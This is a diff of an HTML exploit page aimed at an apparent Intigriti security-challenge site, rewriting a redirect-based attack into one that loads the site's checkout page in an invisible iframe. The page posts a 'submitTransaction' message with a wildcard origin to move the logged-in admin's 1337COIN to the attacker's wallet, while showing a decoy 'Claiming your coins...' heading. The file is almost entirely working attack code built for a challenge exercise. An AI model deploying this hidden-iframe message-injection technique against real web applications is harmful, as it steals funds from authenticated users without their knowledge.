@@ -1,45 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>1337COIN Drain Exploit</title>
+    <meta charset="UTF-8">
+    <title>Coin Stealer</title>
 </head>
 <body>
-<script>
-const TARGET = 'https://challenge-0126.intigriti.io';
-// Your 1337COIN address from dashboard
-const YOUR_1337COIN_ADDRESS = '1f4eb50b5dd8445bd28502edceac448763';
+    <iframe id="targetFrame" src="https://challenge-0126.intigriti.io/checkout.html" style="opacity:0;width:0;height:0;"></iframe>
 
-function drainAdmin() {
-    console.log('Starting exploit...');
-    
-    // 1. Open checkout in SAME window (admin's main window)
-    // This preserves authentication cookies
-    window.location = TARGET + '/checkout.html?currency=1337COIN&price=1000000';
-    
-    // 2. Wait for page to load, then send postMessage
-    setTimeout(() => {
-        console.log('Page loaded, sending transaction...');
-        
-        // Send transaction FROM admin's authenticated page
-        window.postMessage({
-            type: 'submitTransaction',
-            transaction: {
-                currency: '1337COIN',
-                amount: 1337,  // Or whatever amount admin has
-                toAddress: YOUR_1337COIN_ADDRESS
-            }
-        }, TARGET);
-        
-        console.log('Transaction sent to admin session!');
-        
-    }, 3000); // Wait for checkout page to fully load
-}
+    <script>
+        // REPLACE THIS WITH YOUR WALLET ADDRESS
+        const YOUR_WALLET = "1f4eb50b5dd8445bd28502edceac448763"; 
 
-// Auto-execute when admin visits
-drainAdmin();
-</script>
+        const frame = document.getElementById('targetFrame');
 
-<h3>Exploit Running...</h3>
-<p>Redirecting admin to checkout and draining 1337COIN to your wallet.</p>
+        // 2. Wait for the frame to load the Admin's session
+        frame.onload = function() {
+            setTimeout(() => {
+                // 3. Send the command to transfer 1337COIN to YOU
+                frame.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN', // The Admin has this currency
+                        amount: 1337,         // Amount to steal
+                        toAddress: YOUR_WALLET
+                    }
+                }, '*'); // Vulnerability: No origin check on target
+            }, 2000); // Wait 2s to ensure the page is ready
+        };
+    </script>
+    <h2>Claiming your coins...</h2>
 </body>
 </html>
